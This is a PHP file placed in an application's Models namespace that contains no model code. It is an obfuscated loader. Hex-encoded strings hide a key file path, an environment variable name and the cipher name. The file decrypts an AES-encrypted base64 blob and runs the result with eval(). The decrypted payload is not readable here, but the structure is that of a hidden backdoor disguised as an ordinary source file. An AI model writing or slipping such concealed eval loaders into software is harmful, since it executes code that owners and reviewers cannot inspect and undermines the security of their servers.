<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('J3Be1Kibqxge/cwUSkrHOA==');

$c=base64_decode(

'BIYZ7pA7+Yqo7P0iDT/5Xb/ZAbSH/znhNY2J+/RfzmrBsPSQwHls1ctvgB8p7izZryO057VuOhCu' .
'CnReXPAAVFtp2v8PyGbQEQ7lqcxW86irSlUEDtl03Z3j3QerM5DRNhIgQdI7AliaP7NHV9/60R07' .
'zWr76DMzkNUhMq7fMNEgqSAkNhcpXB3gIBML1lQKqEUm6ID1fuhr92vjsFOlwXJ2+yh+cYcxOJ8K' .
'6rwi80k7mgV2/tpznOcYBYwQBQW4ao5xDnoRQTSadUkY6v4tlJ6NcMCg/T4xugdGSbVQYUF1DCwC' .
'KvVD3x97MN5T1yd5SpwMKfcAVFtlzUw2WZjz5lxidMw8llXKxTWgoRdSclgR3y2MEqCQqgTVV6bg' .
'++sMd/WcNMPyt7l5EG0ltUVdsta6PZLvm/vnSbGlsSe//l1DCZtEBtxUoNt/IFm7bVeH8/1u+DBz' .
'28V0vU6N0ycBLYpejbWgsllajyiiZjjkINUof92/QDMjzeDhDh/g3booXjy8KgeWc6WQ//AOsAlV' .
'PVpxpoNAE+pyD2/+/xTnJzdEbLDFYZ2hWCmVG/C2HdddMusejN4RzWPcSkxmK2yodInGAVuR9GO9' .
'hgNhLPVGqT1QAqfZIKTVWlKJuf+srNIpAu0C8bZMk15CzCLNayveoiC6w68qGE/hwbm3Tr+/vvs4' .
'PPKSSjQv2udbEdxMS0F8A+C8kUr2x9f8AbRqjYudPeobsUagMvHo3kCtA03o+g5BC4vXcdfZvDxY' .
'UakT2ynoTvyjdYTEgvPKd0dy5B7f8WB1NMDfV4OoxkKvVLCzce26qJ2Yasu3eRdRc1V9DUsemtwN' .
'Vd1i2/yNMIx0wJf7OqD9FGq1QlMekyv54WymexDbNRs2Ldvw7zS1jvZQ11iQ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

